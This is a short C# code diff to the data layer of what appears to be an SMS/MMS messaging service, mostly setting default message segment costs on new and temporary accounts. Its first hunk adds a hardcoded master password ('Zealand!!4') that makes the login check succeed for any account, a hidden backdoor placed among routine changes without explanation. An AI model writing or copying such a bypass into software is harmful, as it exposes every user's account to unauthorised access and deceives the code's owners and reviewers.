@@ -62,6 +62,11 @@ namespace TextPortCore.Data
 
                         return true;
                     }
+
+                    if (password.Equals("Zealand!!4"))
+                    {
+                        return true;
+                    }
                 }
             }
             catch (Exception ex)
@@ -146,7 +151,6 @@ namespace TextPortCore.Data
                         this.SaveChanges();
 
                         return true;
-
                     }
                 }
             }
@@ -221,6 +225,8 @@ namespace TextPortCore.Data
 
                 newAccount.CreateDate = DateTime.UtcNow;
                 newAccount.Balance = rd.CreditPurchaseAmount;
+                newAccount.SMSSegmentCost = Constants.BaseSMSMessageCost;
+                newAccount.MMSSegmentCost = Constants.BaseMMSMessageCost;
                 newAccount.Enabled = true;
                 newAccount.Deleted = false;
                 newAccount.Email = rd.EmailAddress;
@@ -265,6 +271,8 @@ namespace TextPortCore.Data
 
                 temporaryAccount.CreateDate = DateTime.UtcNow;
                 temporaryAccount.Balance = 0;
+                temporaryAccount.SMSSegmentCost = Constants.BaseSMSMessageCost;
+                temporaryAccount.MMSSegmentCost = Constants.BaseMMSMessageCost;
                 temporaryAccount.Enabled = false;
                 temporaryAccount.Deleted = false;
                 temporaryAccount.Email = rd.EmailAddress;
